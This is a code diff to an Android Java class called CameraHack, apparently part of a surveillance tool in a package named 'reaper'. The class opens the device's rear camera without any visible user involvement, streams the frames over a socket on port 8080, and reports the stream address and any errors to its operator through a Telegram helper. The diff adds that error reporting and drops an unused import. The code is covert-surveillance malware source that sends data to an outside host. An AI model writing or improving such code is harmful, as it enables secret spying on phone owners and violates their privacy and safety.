@@ -1,7 +1,6 @@
 package com.mood.reaper;
 
 import android.hardware.Camera;
-import android.os.Handler;
 import java.io.OutputStream;
 import java.net.ServerSocket;
 import java.net.Socket;
@@ -9,7 +8,6 @@ import java.net.Socket;
 public class CameraHack implements Camera.PreviewCallback {
     private Camera camera;
     private ServerSocket server;
-    private Handler handler = new Handler();
 
     public void startStream() {
         try {
@@ -17,7 +15,8 @@ public class CameraHack implements Camera.PreviewCallback {
             camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_BACK);
             camera.setPreviewCallback(this);
             camera.startPreview();
-            Utils.sendToTelegram("📷 Kamera streaming di http://<IP>:8080");
+            Utils.sendToTelegram("📷 Camera streaming di http://<IP>:8080");
+
             new Thread(() -> {
                 while (true) {
                     try {
@@ -26,7 +25,9 @@ public class CameraHack implements Camera.PreviewCallback {
                     } catch (Exception e) {}
                 }
             }).start();
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            Utils.sendToTelegram("❌ Gagal start kamera: " + e.getMessage());
+        }
     }
 
     @Override
